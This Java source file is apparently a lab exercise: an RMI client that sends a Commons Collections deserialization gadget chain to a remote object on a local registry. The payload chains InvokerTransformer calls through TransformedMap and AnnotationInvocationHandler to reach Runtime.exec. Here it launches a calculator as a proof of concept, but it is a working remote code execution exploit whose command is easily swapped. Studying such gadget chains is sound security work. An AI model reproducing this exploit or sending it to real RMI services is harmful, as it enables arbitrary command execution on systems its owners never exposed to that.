package SimpleRMI_3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class UserClientEval {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry(3333);
        User userClient = (User) registry.lookup("HelloRegistry");
        System.out.println(userClient.name("test"));
        userClient.say("world");// 这里会在server端输出
        userClient.dowork(getpayload());
    }

    public static Object getpayload() {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);

            Map map = new HashMap();
            map.put("value", "test");
            Map transformedMap = TransformedMap.decorate(map, null, transformerChain);

            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Target.class, transformedMap);
            return instance;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}